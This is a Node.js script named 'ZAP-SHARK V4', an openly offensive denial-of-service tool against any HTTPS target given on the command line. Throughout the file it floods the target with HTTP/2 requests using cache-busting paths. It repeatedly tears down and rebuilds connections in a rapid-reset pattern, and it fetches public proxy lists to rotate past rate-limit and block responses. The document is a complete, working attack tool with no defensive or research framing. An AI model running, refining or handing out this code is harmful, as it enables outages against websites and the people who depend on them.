const http2 = require('http2');
const https = require('https');
const os = require('os');
const { exec } = require('child_process');

class ZAPSHARK_V4 {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.status = "ATTACKING";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        this.wifiConnected = true;
        
        // PROXY SYSTEM
        this.proxyApi = 'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all';
        this.currentProxy = null;
        this.proxyList = [];
        this.proxyIndex = 0;
        this.proxyStartTime = Date.now();
        this.lastProxyRotate = Date.now();
        this.proxyRotationInterval = 600000; // 10 minutes
        this.proxyRetryInterval = 600000; // 10 minutes if no proxy
        
        // CONNECTION SYSTEM
        this.connectionPool = [];
        this.activeStreams = 0;
        this.poolSize = 20; // DOUBLE AGGRESSION
        this.maxStreamsPerConn = 1000;
        this.lastConnectionReset = Date.now();
        this.connectionResetInterval = 500; // RESET EVERY 0.5s
        
        // RESPONSE TRACKING
        this.lastResponseCode = 0;
        this.responseCodeCounts = {};
        this.lastCodeUpdate = Date.now();
        
        // CONNECTION CHECK
        this.initialConnectionMade = false;
        this.connectionCheckDone = false;
        
        // MAINTENANCE
        this.lastMaintenance = Date.now();
        this.maintenanceInterval = 3600000;
        this.maintenanceDuration = 600000;
        
        // INTERVALS
        this.attackInterval = null;
        this.displayInterval = null;
    }

    // === INITIAL CONNECTION CHECK ===
    async checkInitialConnection() {
        return new Promise((resolve) => {
            const testClient = http2.connect(this.targetUrl);
            testClient.on('connect', () => {
                console.log('ZAP-SHARK | CONNECTED TO HOST');
                testClient.destroy();
                setTimeout(() => {
                    process.stdout.write('\x1B[2J\x1B[0f'); // Clear terminal after 10s
                    resolve(true);
                }, 10000);
            });
            testClient.on('error', () => {
                console.log('ZAP-SHARK | CONNECTION FAILED');
                testClient.destroy();
                resolve(false);
            });
        });
    }

    // === PROXY MANAGEMENT ===
    async fetchProxies() {
        return new Promise((resolve) => {
            https.get(this.proxyApi, (res) => {
                let data = '';
                res.on('data', (chunk) => data += chunk);
                res.on('end', () => {
                    const proxies = data.trim().split('\n').filter(p => p);
                    this.proxyList = proxies.map(p => p.trim());
                    console.log(`[+] Loaded ${this.proxyList.length} proxies`);
                    resolve(this.proxyList.length > 0);
                });
            }).on('error', () => {
                console.log('[-] Failed to fetch proxies');
                resolve(false);
            }).setTimeout(10000);
        });
    }

    getNextProxy() {
        if (this.proxyList.length === 0) {
            return null;
        }
        
        this.proxyIndex = (this.proxyIndex + 1) % this.proxyList.length;
        return this.proxyList[this.proxyIndex];
    }

    async rotateProxy() {
        const now = Date.now();
        if (now - this.lastProxyRotate >= this.proxyRotationInterval) {
            const newProxy = this.getNextProxy();
            if (newProxy) {
                this.currentProxy = newProxy;
                this.proxyStartTime = now;
                this.lastProxyRotate = now;
                return true;
            } else {
                // No proxy available, retry in 10 mins
                setTimeout(() => this.rotateProxy(), this.proxyRetryInterval);
                return false;
            }
        }
        return false;
    }

    // === CONNECTION SYSTEM ===
    setupConnections() {
        // DESTROY ALL OLD
        this.connectionPool.forEach(c => { try { c.destroy(); } catch (e) {} });
        this.connectionPool = [];
        
        // CREATE NEW POOL
        for (let i = 0; i < this.poolSize; i++) {
            setTimeout(() => {
                try {
                    const client = http2.connect(this.targetUrl, {
                        maxSessionMemory: 131072, // DOUBLE MEMORY
                        maxDeflateDynamicTableSize: 4294967295,
                        peerMaxConcurrentStreams: 2000
                    });
                    
                    client.setMaxListeners(2000);
                    
                    client.settings({
                        enablePush: false,
                        initialWindowSize: 16777215,
                        maxConcurrentStreams: 2000
                    });
                    
                    client.on('error', () => {});
                    
                    this.connectionPool.push(client);
                } catch (err) {}
            }, i * 10); // FASTER CONNECTION ESTABLISHMENT
        }
    }

    // === AGGRESSIVE RAPID RESET ===
    resetConnections() {
        const now = Date.now();
        if (now - this.lastConnectionReset >= this.connectionResetInterval) {
            // RESET 50% OF CONNECTIONS EVERY 0.5s
            const resetCount = Math.ceil(this.connectionPool.length * 0.5);
            
            for (let i = 0; i < resetCount; i++) {
                const index = Math.floor(Math.random() * this.connectionPool.length);
                if (this.connectionPool[index]) {
                    try {
                        this.connectionPool[index].destroy();
                        // CREATE NEW CONNECTION IMMEDIATELY
                        const newClient = http2.connect(this.targetUrl, {
                            maxSessionMemory: 131072
                        });
                        newClient.setMaxListeners(2000);
                        newClient.on('error', () => {});
                        this.connectionPool[index] = newClient;
                    } catch (err) {}
                }
            }
            
            this.lastConnectionReset = now;
        }
    }

    // === MAX AGGRESSION REQUEST ===
    sendRequest() {
        if (!this.wifiConnected || this.connectionPool.length === 0) return;
        
        // RAPID RESET
        this.resetConnections();
        
        // CALCULATE MAX STREAMS (AGGRESSIVE)
        const maxStreams = this.maxStreamsPerConn * this.connectionPool.length;
        const availableStreams = maxStreams - this.activeStreams;
        const streamsThisTick = Math.min(availableStreams, 50); // 50 STREAMS PER TICK
        
        for (let i = 0; i < streamsThisTick; i++) {
            const client = this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
            if (!client) continue;

            try {
                this.activeStreams++;
                
                const req = client.request({
                    ':method': 'GET',
                    ':path': '/?' + Date.now() + Math.random().toString(36).substr(2, 5),
                    ':authority': this.hostname,
                    'user-agent': 'Mozilla/5.0',
                    'accept': '*/*'
                });
                
                req.on('response', (headers) => {
                    const code = headers[':status'] || 0;
                    this.lastResponseCode = code;
                    this.responseCodeCounts[code] = (this.responseCodeCounts[code] || 0) + 1;
                    
                    // COUNT RATE LIMITS FOR PROXY ROTATION
                    if (code === 429 || code === 403 || code === 503) {
                        setTimeout(() => this.rotateProxy(), 1000);
                    }
                });
                
                req.on('error', () => {});
                
                req.on('close', () => {
                    this.activeStreams--;
                    this.totalRequests++;
                    this.requestsSinceLastCalc++;
                });
                
                req.end();
                
            } catch (err) {
                this.activeStreams--;
                this.totalRequests++;
                this.requestsSinceLastCalc++;
            }
        }
    }

    // === RPS CALCULATION ===
    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    getMostCommonResponseCode() {
        let maxCount = 0;
        let mostCommonCode = this.lastResponseCode || 0;
        
        for (const [code, count] of Object.entries(this.responseCodeCounts)) {
            if (count > maxCount) {
                maxCount = count;
                mostCommonCode = parseInt(code);
            }
        }
        return mostCommonCode;
    }

    getTimeUntilMaintenance() {
        const now = Date.now();
        const nextMaintenance = this.lastMaintenance + this.maintenanceInterval;
        const timeLeft = nextMaintenance - now;
        
        if (timeLeft <= 0) return "NOW";
        
        const minutes = Math.floor(timeLeft / 60000);
        const seconds = Math.floor((timeLeft % 60000) / 1000);
        return `${minutes}m ${seconds}s`;
    }

    getProxyTimeLeft() {
        const now = Date.now();
        const timeUsed = now - this.proxyStartTime;
        const timeLeft = this.proxyRotationInterval - timeUsed;
        
        if (timeLeft <= 0) return "CHANGING...";
        
        const minutes = Math.floor(timeLeft / 60000);
        const seconds = Math.floor((timeLeft % 60000) / 1000);
        return `${minutes}m ${seconds}s`;
    }

    // === NEW LOGGING SYSTEM ===
    updateDisplay() {
        this.calculateRPS();
        
        const now = new Date();
        const localTime = now.toLocaleTimeString('en-US', { 
            hour12: false,
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
        
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const runtimeMinutes = Math.floor(runtime / 60);
        const runtimeSeconds = runtime % 60;
        const runtimeStr = `${runtimeMinutes.toString().padStart(2, '0')}:${runtimeSeconds.toString().padStart(2, '0')}`;
        
        const liveResponseCode = this.getMostCommonResponseCode();
        const proxyDisplay = this.currentProxy ? 
            this.currentProxy.split(':')[0] + ':****' : 
            'FETCHING...';
        
        // CLEAR AND OVERWRITE
        process.stdout.write('\x1B[2J\x1B[0f');
        console.log(`ZAP-SHARK — (${runtimeStr}) | SAM: ${localTime}`);
        console.log('=================================');
        console.log(`SHARK-TRS — ${this.totalRequests}`);
        console.log(`SHARK-LHC — ${liveResponseCode}`);
        console.log('=================================');
        console.log(`ZAP-SHARK | ${proxyDisplay} | ${this.getTimeUntilMaintenance()}`);
        
        // SHOW CURRENT RPS INLINE
        process.stdout.write(`\n[RPS: ${this.currentRPS.toFixed(1)} | CONNS: ${this.connectionPool.length} | STREAMS: ${this.activeStreams}]`);
    }

    // === MAINTAINCE ===
    checkMaintenance() {
        const now = Date.now();
        if (now - this.lastMaintenance >= this.maintenanceInterval) {
            this.status = "PAUSED";
            console.log('\n[!] MAINTENANCE STARTED - PAUSING FOR 10 MINUTES [!]');
            
            // FLUSH DNS
            exec('ipconfig /flushdns >nul 2>&1 || true', () => {});
            
            // DESTROY CONNECTIONS
            this.connectionPool.forEach(c => { try { c.destroy(); } catch (e) {} });
            this.connectionPool = [];
            
            setTimeout(() => {
                this.status = "ATTACKING";
                this.lastMaintenance = Date.now();
                this.setupConnections();
                console.log('\n[+] MAINTENANCE COMPLETE - RESUMING ATTACK');
            }, this.maintenanceDuration);
        }
    }

    // === MAIN ===
    async start() {
        console.log('=== ZAP-SHARK V4 - PROXY AGGRESSION ===');
        console.log('Target:', this.targetUrl);
        console.log('='.repeat(50));
        
        // INITIAL CONNECTION CHECK
        this.initialConnectionMade = await this.checkInitialConnection();
        if (!this.initialConnectionMade) {
            console.log('Failed to connect to target');
            process.exit(1);
        }
        
        // LOAD PROXIES
        await this.fetchProxies();
        if (this.proxyList.length > 0) {
            this.currentProxy = this.proxyList[0];
            this.proxyStartTime = Date.now();
        }
        
        // SETUP CONNECTIONS
        this.setupConnections();
        
        // START ATTACK
        setTimeout(() => {
            // MAIN ATTACK LOOP (ULTRA AGGRESSIVE)
            this.attackInterval = setInterval(() => {
                if (this.status === "ATTACKING") {
                    // SEND 10 BATCHES PER TICK
                    for (let i = 0; i < 10; i++) {
                        this.sendRequest();
                    }
                }
            }, 0.05); // 20ms INTERVAL
            
            // DISPLAY UPDATE
            this.displayInterval = setInterval(() => {
                this.updateDisplay();
            }, 100); // UPDATE 10x PER SECOND
            
            // PROXY ROTATION CHECK
            setInterval(() => {
                this.rotateProxy();
            }, 30000); // CHECK EVERY 30s
            
            // MAINTENANCE CHECK
            setInterval(() => {
                this.checkMaintenance();
            }, 10000);
            
            // WIFI CHECK
            setInterval(() => {
                const interfaces = os.networkInterfaces();
                this.wifiConnected = false;
                for (const iface in interfaces) {
                    for (const config of interfaces[iface]) {
                        if (!config.internal && config.family === 'IPv4' && config.address !== '127.0.0.1') {
                            this.wifiConnected = true;
                            break;
                        }
                    }
                }
                if (!this.wifiConnected) {
                    this.status = "PAUSED";
                }
            }, 2000);
            
        }, 1000);
        
        process.on('SIGINT', () => {
            this.running = false;
            clearInterval(this.attackInterval);
            clearInterval(this.displayInterval);
            console.log('\n=== ZAP-SHARK V4 STOPPED ===');
            process.exit(0);
        });
    }
}

// USAGE
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    console.log('Usage: node zap-shark-v4.js https://target.com');
    process.exit(1);
}

const shark = new ZAPSHARK_V4(target);
shark.start();
